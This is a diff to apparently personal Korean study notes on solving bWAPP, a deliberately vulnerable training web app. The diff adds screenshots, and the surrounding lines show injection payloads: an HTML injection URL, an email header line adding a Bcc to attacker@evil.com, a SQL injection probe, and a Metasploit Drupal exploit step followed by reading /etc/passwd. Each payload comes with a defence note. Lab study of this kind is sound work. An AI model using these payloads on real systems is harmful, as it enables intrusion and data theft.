@@ -2,6 +2,9 @@
 
 > bWAPP(buggy Web APPlication)은 다양한 웹 취약점을 안전한 환경에서 직접 실습해볼 수 있도록 만들어진 모의 해킹 훈련용 웹 애플리케이션입니다. 본 문서는 개인 학습 과정에서 정리한 풀이/공략 노트입니다.
 
+<img width="486" height="187" alt="스크린샷 2026-06-25 163753" src="https://github.com/user-attachments/assets/bc645a11-170a-44cb-82c7-751d22908f8c" />
+
+
 ---
 
 ## 📑 목차
@@ -65,6 +68,9 @@
 ```
 http://[bWAPP-IP]/bWAPP/htmli_get.php?firstname=%3Ch1%3Ehack%3C%2Fh1%3E&lastname=test&form=submit
 ```
+
+<img width="1058" height="1023" alt="beeboxreflect" src="https://github.com/user-attachments/assets/981923db-026b-43b9-b1a9-9cd8cef251e8" />
+
 
 **방어법**: 출력 시 `htmlspecialchars()` 등으로 HTML 엔티티 인코딩 처리.
 
@@ -282,6 +288,9 @@ victim@test.com%0ABcc:attacker@evil.com
 movie=1'
 ```
 
+<img width="1070" height="1029" alt="repeate기능,sql injection select" src="https://github.com/user-attachments/assets/3fd1fc55-2000-479e-8f9e-7376910152cd" />
+
+
 ---
 
 ### 15. SQL Injection (AJAX/JSON/jQuery)
@@ -356,6 +365,9 @@ exploit
 # 쉘 획득 후
 cat /etc/passwd
 ```
+
+<img width="1082" height="1036" alt="metasploit" src="https://github.com/user-attachments/assets/6f291a58-d2e2-451f-9377-0ac257bd9ec0" />
+
 
 **방어법**: 패치(SA-CORE-2014-005) 적용 / 최신 버전 업그레이드.
 
@@ -541,6 +553,9 @@ PW: test
 ### 📌 참고: 폰 노이만 구조 (메모해둔 배경지식)
 
 > 컴퓨터 구조는 명령을 처리하는 **CPU**, 데이터를 임시 저장하는 **메모리**, 그리고 이들을 연결하는 **버스(Bus)** 로 이루어지며, 데이터를 메모리에 저장해두고 CPU가 하나씩 꺼내어 처리하는 **폰 노이만 방식**이 핵심입니다. (CPU / Memory / I/O)
+
+<img width="829" height="761" alt="스크린샷 2026-06-25 133147" src="https://github.com/user-attachments/assets/8669e822-cf7a-4bc4-aa01-011eb5026c70" />
+
 
 ---
 
